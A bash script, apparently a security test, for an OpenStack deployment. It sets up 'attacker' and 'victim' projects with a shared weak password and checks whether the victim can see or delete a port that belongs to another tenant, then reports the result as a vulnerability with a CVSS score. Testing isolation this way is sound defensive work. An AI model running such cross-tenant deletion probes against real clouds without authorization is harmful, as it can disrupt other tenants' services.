#!/bin/bash

echo "==== Neutron Port Isolation Test ===="
echo ""
echo "Testing cross-tenant port visibility and deletion"
echo ""

source /etc/kolla/admin-openrc.sh

# Setup
echo "[1] Creating test projects and users..."
openstack project create test-attacker 2>/dev/null
openstack project create test-victim 2>/dev/null
openstack user create test-attacker --password test123 --project test-attacker 2>/dev/null
openstack user create test-victim --password test123 --project test-victim 2>/dev/null
openstack role add --project test-attacker --user test-attacker member 2>/dev/null
openstack role add --project test-victim --user test-victim member 2>/dev/null

ATTACKER_PROJECT=$(openstack project show test-attacker -f value -c id)
VICTIM_PROJECT=$(openstack project show test-victim -f value -c id)

echo "  Attacker: $ATTACKER_PROJECT"
echo "  Victim: $VICTIM_PROJECT"
echo ""

# Create victim network
echo "[2] Creating victim network..."
export OS_PROJECT_NAME=test-victim
export OS_USERNAME=test-victim
export OS_PASSWORD=test123
export OS_USER_DOMAIN_NAME=Default
export OS_PROJECT_DOMAIN_NAME=Default
export OS_IDENTITY_API_VERSION=3
export OS_AUTH_URL=http://192.168.100.11:5000

openstack network create victim-test-net 2>/dev/null
openstack subnet create victim-test-subnet \
  --network victim-test-net \
  --subnet-range 172.16.0.0/24 2>/dev/null

VICTIM_NET=$(openstack network show victim-test-net -f value -c id)
echo "  Network: $VICTIM_NET"

# Victim creates port
echo "[3] Victim creating port..."
openstack port create --network victim-test-net victim-own-port
VICTIM_PORT=$(openstack port show victim-own-port -f value -c id)
echo "  Port: $VICTIM_PORT"
echo ""

# Admin creates cross-tenant port
source /etc/kolla/admin-openrc.sh
echo "[4] Admin creating port on victim network as attacker project..."
openstack port create \
  --network $VICTIM_NET \
  --project test-attacker \
  cross-tenant-test-port

CROSS_PORT=$(openstack port show cross-tenant-test-port -f value -c id)
echo "  Cross-tenant port: $CROSS_PORT"
echo ""

# TEST 1: Visibility
export OS_PROJECT_NAME=test-victim
export OS_USERNAME=test-victim
export OS_PASSWORD=test123
export OS_USER_DOMAIN_NAME=Default
export OS_PROJECT_DOMAIN_NAME=Default
export OS_IDENTITY_API_VERSION=3
export OS_AUTH_URL=http://192.168.100.11:5000

echo "[5] TEST: Can victim see cross-tenant port?"
VISIBLE=$(openstack port list | grep -c "cross-tenant-test-port")
if [ "$VISIBLE" -gt 0 ]; then
    echo "  FAIL: Victim CAN see attacker's port (information disclosure)"
    echo "  VULN: Cross-tenant port visibility"
else
    echo "  PASS: Victim cannot see cross-tenant port"
fi
echo ""

# TEST 2: Deletion
echo "[6] TEST: Can victim delete cross-tenant port?"
openstack port delete cross-tenant-test-port 2>&1 | head -3

source /etc/kolla/admin-openrc.sh
STILL_EXISTS=$(openstack port list | grep -c "cross-tenant-test-port")
if [ "$STILL_EXISTS" -eq 0 ]; then
    echo "  CRITICAL: Victim DELETED attacker's port!"
    echo "  VULN: Unauthorized cross-tenant port deletion"
    RESULT="VULNERABLE"
else
    echo "  PASS: Cross-tenant port still exists (deletion blocked)"
    RESULT="SECURE"
fi
echo ""

# Cleanup
echo "[7] Cleanup..."
source /etc/kolla/admin-openrc.sh
openstack port delete victim-own-port 2>/dev/null
openstack port delete cross-tenant-test-port 2>/dev/null
openstack subnet delete victim-test-subnet 2>/dev/null
openstack network delete victim-test-net 2>/dev/null
openstack user delete test-attacker 2>/dev/null
openstack user delete test-victim 2>/dev/null
openstack project delete test-attacker 2>/dev/null
openstack project delete test-victim 2>/dev/null

echo "Cleanup complete"
echo ""
echo "========================================="
echo "           RESULTS SUMMARY"
echo "========================================="
echo ""
echo "Port Isolation Test: $RESULT"
if [ "$RESULT" = "VULNERABLE" ]; then
    echo ""
    echo "CRITICAL VULNERABILITY FOUND"
    echo "   Users can delete ports owned by other projects"
    echo "   on shared networks"
    echo ""
    echo "   Impact: Data destruction, service disruption"
    echo "   Severity: CRITICAL (CVSS 8.1)"
fi
